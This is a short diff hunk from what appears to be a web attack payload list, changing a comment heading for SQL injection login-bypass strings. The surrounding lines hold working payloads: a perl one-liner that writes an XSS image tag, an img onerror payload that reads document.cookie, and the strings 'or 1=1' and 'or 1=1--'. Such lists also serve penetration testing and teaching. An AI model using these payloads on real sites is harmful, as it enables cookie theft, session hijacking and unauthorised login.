@@ -513,7 +513,7 @@ perl -e 'print "<IMG SRC=javascript:alert(\"XSS\")>";' > out
 <img src=asdf onerror=alert(document.cookie)>
 
 
-#auth bypass sqli strings
+# auth bypass 
 
 or 1=1
 or 1=1--
